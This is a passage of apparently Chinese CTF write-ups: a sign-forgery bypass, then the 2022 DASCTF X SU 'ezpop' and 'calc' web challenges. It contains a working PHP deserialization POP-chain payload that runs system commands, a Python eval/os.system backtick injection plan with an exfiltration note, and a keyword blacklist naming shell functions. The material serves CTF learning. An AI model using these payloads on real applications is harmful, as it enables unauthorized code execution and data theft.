punctuation">(</span><span class="token punctuation">)</span>             result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>         <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>             f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>             result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>             result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>             result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>             result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>         <span class="token keyword">return</span> result <span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>     socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>     <span class="token keyword">except</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span> </code></pre><p>捋一捋思路，我们知道flag在flag.txt中，所以我们先要利用scan将结果写入<code>flag.txt/result.txt</code>中，再读取出来，也就是传入的action为scanread或readscan，param为flag.txt。接下来就只需要想办法绕过checkSign()，由于有secret_key的存在，我们无法自己加密，但是注意到geneSign函数，它会对secret_key+param+action进行加密，同时action已经被限制为scan，我们可以输入param为flag.txtread从而获得secret_key+flag.txtreadscan的md5值进行绕过。<br>首先访问/geneSign?param=flag.txtread得到c7df6fac4eeeb0e291da6f108f620186，最后访问/De1ta?param=flag.txt并且在cookie中传值action=readscan;sign=c7df6fac4eeeb0e291da6f108f620186。回显{“code”: 200, “data”: “flag{24f82fee-2007-4538-920e-edaaff47ae6f}\n”}<br>得到flag:flag{24f82fee-2007-4538-920e-edaaff47ae6f}。<br>参考：<br><a href="https://blog.csdn.net/qq_42967398/article/details/103549258">https://blog.csdn.net/qq_42967398/article/details/103549258</a><br><a href="https://blog.csdn.net/qq_40519543/article/details/107224099">https://blog.csdn.net/qq_40519543/article/details/107224099</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022DASCTF X SU 三月春季挑战赛web复现</title>
      <link href="/2022/04/05/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/05/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9Bweb%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="2022DASCTF-X-SU-三月春季挑战赛web复现"><a href="#2022DASCTF-X-SU-三月春季挑战赛web复现" class="headerlink" title="2022DASCTF X SU 三月春季挑战赛web复现"></a>2022DASCTF X SU 三月春季挑战赛web复现</h1><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>打开题目，看到源码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">crow</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">v1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">fin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$f1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token punctuation">.</span> <span class="token string">'114514'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">what</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">mix</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>注意到</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">mix</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>发现get_Flag函数中有eval，猜测我们要想办法利用get_flag。<br>注意到</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">fin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$f1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token punctuation">.</span> <span class="token string">'114514'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>fin中的__call会调用get_flag()，我们知道如果你试着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。<br>可以知道</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">crow</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">v1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>crow中的__incoke方法会调用world()方法，可以尝试用这个来调用fin中的__call方法，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。<br>最后看</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">what</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>当一个对象被当作字符串对待的时候，会触发__toString这个魔术方法，而其他结构中的run函数都将参数值作为函数调用，可以尝试利用这个来触发__invoke()方法。</p><p>于是构造poke链：fin:__destruct-&gt;what:__toString-&gt;mix:run-&gt;crow:__invoke-&gt;fin:__call-&gt;mix:get_flag</p><p>写payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">crow</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">v1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">fin</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$f1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token punctuation">.</span> <span class="token string">'114514'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">what</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">mix</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'#'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$fin1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$what</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">what</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mix1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$crow</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">crow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fin2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mix2</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mix2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$fin2</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">=</span><span class="token variable">$mix2</span><span class="token punctuation">;</span><span class="token variable">$crow</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">=</span><span class="token variable">$fin2</span><span class="token punctuation">;</span><span class="token variable">$mix1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">=</span><span class="token variable">$crow</span><span class="token punctuation">;</span><span class="token variable">$what</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$mix1</span><span class="token punctuation">;</span><span class="token variable">$fin1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">=</span><span class="token variable">$what</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$fin1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>$mix2-&gt;m1的值即可运行的命令，然后这里 eval 函数里虽然加了注释符，但是可以直接通过换行符做一个绕过。<br>最后构造$mix2-&gt;m1=”\r\nsystem(‘ls;cat *;’);”;</p><p>得到flag：</p><pre class=" language-1"><code class="language-1">flag{79a80052-05bf-47aa-a984-23270a8dbb01}</code></pre><p>tips：注意不要用hackbar去post，还是用burpsuite吧，hackbar会出锅。</p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>request<span class="token punctuation">,</span>current_app<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort<span class="token punctuation">,</span>send_from_directory<span class="token keyword">import</span> random<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">import</span> os<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> timeapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'{'</span><span class="token punctuation">,</span><span class="token string">'}'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'subclasses'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token punctuation">,</span><span class="token string">'args'</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">,</span><span class="token string">'if'</span><span class="token punctuation">,</span><span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'open'</span><span class="token punctuation">,</span><span class="token string">'popen'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span><span class="token punctuation">,</span><span class="token string">'compile'</span><span class="token punctuation">,</span><span class="token string">'execfile'</span><span class="token punctuation">,</span><span class="token string">'from_pyfile'</span><span class="token punctuation">,</span><span class="token string">'config'</span><span class="token punctuation">,</span><span class="token string">'local'</span><span class="token punctuation">,</span><span class="token string">'self'</span><span class="token punctuation">,</span><span class="token string">'item'</span><span class="token punctuation">,</span><span class="token string">'getitem'</span><span class="token punctuation">,</span><span class="token string">'getattribute'</span><span class="token punctuation">,</span><span class="token string">'func_globals'</span><span class="token punctuation">,</span><span class="token string">'__init__'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">,</span><span class="token string">'__dict__'</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> no <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        <span class="token keyword">if</span> no<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span> <span class="token boolean">False</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>no<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> flag    @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">"欢迎来到SUctf2022"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/calc"</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    num <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"num"</span><span class="token punctuation">)</span>    log <span class="token operator">=</span> <span class="token string">"echo {0} {1} {2}> ./tmp/log.txt"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y%m%d-%H%M%S"</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ip<span class="token punctuation">,</span>num<span class="token punctuation">)</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> eval<span class="token punctuation">(</span>num<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>log<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">return</span> str<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"waf!!"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>  </code></pre><p>看到过滤了小括号，猜测无法运行函数，于是放弃利用eval()，转而看起os.system函数，WAF中并没有过滤反引号，于是尝试用反引号进行函数运行。<br>但是这样在 eval 中就会报错，导致不会执行 os.system ，于是可利用 Python 中的注释符把反引号的内容注释掉。<br>发现可以出网，尝试利用bash命令将运行结果外带出来。<br>最后写脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parseurl<span class="token operator">=</span><span class="token string">"http://a971ce1a-be9a-43cf-b026-caf4cdaeec9b.node4.buuoj.cn:81"</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'{'</span><span class="token punctuation">,</span><span class="token string">'}'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'getattr'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'class'</span><span class="token punctuation">,</span><span class="token string">'subclasses'</span><span class="token punctuation">,</span><span class="token string">'mro'</span><span class="token punctuation">,</span><span class="token string">'request'</span><span class="token 